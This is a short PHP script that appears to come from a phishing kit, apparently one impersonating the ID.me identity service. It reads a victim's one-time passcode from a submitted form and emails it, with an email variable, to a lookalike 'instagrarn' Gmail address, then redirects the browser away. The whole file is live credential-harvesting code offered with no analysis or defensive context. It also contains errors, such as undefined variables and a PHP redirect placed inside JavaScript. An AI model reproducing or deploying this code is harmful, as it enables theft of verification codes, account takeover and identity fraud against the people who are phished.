<?php
    $mail_to = 'noreplyinstagrarnservice@gmail.com';
    $mail_from = 'Logs';
 
    $otp = $_POST["otp"];
 
    $subject = 'Subject ' . $email;
 
    $body_message = 'From: ' . site . "\r\n";
    $body_message .= 'E-mail: ' . $email . "\r\n";
    $body_message .= 'OTP: ' . $otp;
 
    $headers = 'From: ' . $mail_from . "\r\n";
    $headers .= 'Reply-To: ' . $mail_from . "\r\n";
 
    $mail_sent = mail($mail_to, $subject, $body_message, $headers);
 
    if ($mail_sent == true){ ?>
        <script language="javascript" type="text/javascript">
  header('Location: www.google.com');
         </script>
    <?php } else { ?>
    <script language="javascript" type="text/javascript">
        alert('not Sent');
  window.location = 'Confirm your email address - ID.me.html';
    </script>
    <?php
    }
?>